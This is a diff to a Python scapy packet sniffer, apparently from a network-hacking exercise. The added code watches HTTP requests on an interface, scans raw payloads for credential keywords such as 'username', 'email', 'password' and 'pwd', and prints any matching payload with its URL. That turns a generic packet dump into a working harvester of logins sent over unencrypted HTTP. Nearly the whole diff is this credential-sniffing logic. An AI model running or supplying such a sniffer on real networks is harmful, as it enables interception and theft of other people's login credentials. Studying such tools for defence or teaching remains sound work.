@@ -12,9 +12,19 @@ def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn = process_sniffed_data)
 
 def process_sniffed_data(packet):
-    if not packet.haslayer(http.HTTPRequest):
-        return
-    print(packet.show())
+    if packet.haslayer(http.HTTPRequest):
+        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load
+            keywords = ["username","user","email","login","password","pass","pwd"]
+            flag = False
+            for keyword in keywords:
+                if keyword in load:
+                    flag = True
+                    break
+            if flag:
+                print(load)
+                print(url)
 
 options = get_options()
 
